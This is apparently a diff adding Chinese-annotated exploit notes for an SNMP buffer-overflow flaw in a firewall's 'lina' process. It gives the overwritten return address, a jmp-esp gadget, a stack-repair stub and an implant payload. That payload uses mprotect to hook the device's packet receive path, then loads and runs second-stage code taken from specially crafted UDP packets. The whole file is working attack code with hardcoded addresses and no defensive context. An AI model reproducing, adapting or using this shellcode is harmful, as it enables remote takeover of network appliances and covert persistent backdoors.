@@ -1,0 +1,150 @@
+lina804 SNMP 漏洞函数: sub_8a844b0()
+
+
+内存占用：
+1.申请内存：58字节
+2.写内存：134字节
+3.接收数据包：100字节
+4.init部分：50字节
+
+
+
+
+C66ABB94
+C610C1B8
+C66ABFAA
+
+
+正常函数返回地址：08A8648C
+shellcode覆盖函数返回覆盖地址：0x091ABC6D        jmp esp
+
+
+ShellCode_ESP_Jump:
+ESP指向地址代码，栈顶数据：
+mov     edi, [esp+14h]
+mov     eax, [edi]          ;读取SNMP中BULK字段的OID内存地址
+jmp     eax
+
+
+ShellCode_Repair_Stack_Balance:
+EAX指向代码（恢复栈平衡），OID字段：
+mov     eax, 0x091ABC6D     ;snmp_handler()函数正常返回地址   !!!
+sub     esp, 4              ;将栈顶提高4字节
+mov     [esp], eax          ;压入snmp_handler()函数的正常返回地址
+mov     ebp, esp        
+add     ebp, 58h            ;恢复EBP，当前栈帧58h字节 值：0xC66ABC14
+xor     eax, eax
+xor     ebx, ebx
+mov     bl, 10h             ;EBX的值设置为10h
+xor     esi, esi            ;ESI清零
+mov     edi, offset unk_AAAAAAAE 
+xor     edi, 0A5A5A5A5h     ;异或计算原EDI的值，可能出现NULL字符，原本值为：0x0F0F0F0B
+pusha                       ;保存当前所有寄存器值
+mov     eax, [esp+1C8h]
+add     al, 32h             ;计算SNMP中BULK字段的Value内存地址
+call    eax
+popa                        ;弹出保存过的寄存器的值
+retn                        ;返回snmp_handler()调用完成后的正常返回地址
+
+
+ShellCode_Implant_Payload:
+;申请内存池：
+mov      esi, 89BCE60h     ;内存池申请函数       !!!
+push     19000h
+call     esi
+mov      edi, eax          ;EDI存放新申请的内存地址
+call     $+5
+pop      eax
+add      eax, 77           ;patch地址的偏移长度
+mov      [eax], edi        ;修改网络hook代码起始地址
+
+;此处为内存copy代码
+call     $+5
+pop      eax
+mov      esi, 0916BBB0h         ;ESI内存copy函数地址     !!!
+push     117                    ;length
+add      eax, 71                ;偏移长度
+push     eax                    ;src addr
+push     edi                    ;dest addr
+call     esi                    ;memory copy
+
+
+;劫持网络报文接收：
+mov      eax, 7Dh               ;系统调用号,mprotect()
+mov      ebx, 08660000h         ;start addr，必须页对齐，起始地址可被4096整除   !!!
+mov      ecx, 1000h             ;len
+mov      edx, 07h               ;proto
+int      80h
+
+mov      esi, 0916BBB0h         ;ESI内存copy函数地址   !!!
+call     $+5
+pop      eax
+push     6                      ;内存copy长度
+add      eax, 18
+push     eax                    ;copy源地址
+push     08660C8Dh              ;copy目的地址          !!!
+call     esi    
+add      esp, 28
+retn             
+
+
+;hook code
+push     11223344h              ;跳转到packet handler     !!!
+retn
+
+;packet handler
+mov      edx, [eax+0Ch]
+mov      [ebp-24], edx
+pusha
+call     packet_handler
+popa
+push     08660C93h                 ;跳转回正常代码：08660C93h    !!!
+retn
+
+packet_handler:
+call     $+5
+pop      edx
+add      edx, 64h                  ;EDI存放Payload写入地址
+mov      esi, [ebp-8]              ;取出报文指针
+mov      edi, [ebp+10h]
+cmp      byte ptr [esi+12], 81h    ;判断是否带有Vlan Tag
+jnz      skip_vlan_tag
+add      esi, 4                    ;向后偏移4字节
+skip_vlan_tag:
+cmp      dword ptr [edx], 00h      ;判断是否已接收到Payload
+jz       recv_payload
+push     edi
+push     esi
+call     edx                       ;调用Payload
+add      esp, 8
+jmp      return
+
+recv_payload:
+cmp      word ptr [esi+0Ch], 08h   ;判断IP报文
+jnz      return
+cmp      byte ptr [esi+17h], 11h   ;判断UDP报文
+jnz      return
+cmp      word ptr [esi+24h], 0     ;判断目的端口
+jnz      return
+cmp      word ptr [esi+22h], 0     ;判断源端口
+jnz      return
+xor      ebx, ebx
+mov      bl, byte ptr [esi+27h]
+mov      bh, byte ptr [esi+26h]
+sub      bx, 8
+push     ebx
+mov      ecx, esi
+add      ecx, 42
+push     ecx
+push     edx
+mov      eax, 0916BBB0h            ;内存copy函数地址    !!!
+call     eax
+add      esp, 12
+
+return:
+retn
+
+
+
+
+
